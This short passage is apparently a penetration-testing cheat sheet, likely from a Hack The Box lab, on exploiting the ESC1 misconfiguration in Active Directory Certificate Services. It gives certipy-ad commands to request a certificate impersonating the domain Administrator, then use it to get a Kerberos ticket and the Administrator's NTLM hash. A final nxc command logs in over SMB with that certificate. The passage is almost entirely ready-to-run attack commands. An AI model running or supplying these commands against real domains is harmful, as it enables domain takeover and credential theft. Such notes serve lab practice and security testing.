___
### ESC1
If a template is vulnerable to ESC1, certipy can automatically exploit it.
Request the Administrators certificate:
```bash
certipy-ad req -u <user> -p <password> -dc-ip <IP> -template <Template Name> -upn Administrator@certified.htb -ca <Certificate Authorities> -target dc.domain.local
```
Request TGS & NTLM hash with certificate:
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip <IP>
```
Or with NXC:
```bash
nxc smb <IP> --pfx-cert administrator.pfx -u 'Administrator'
```
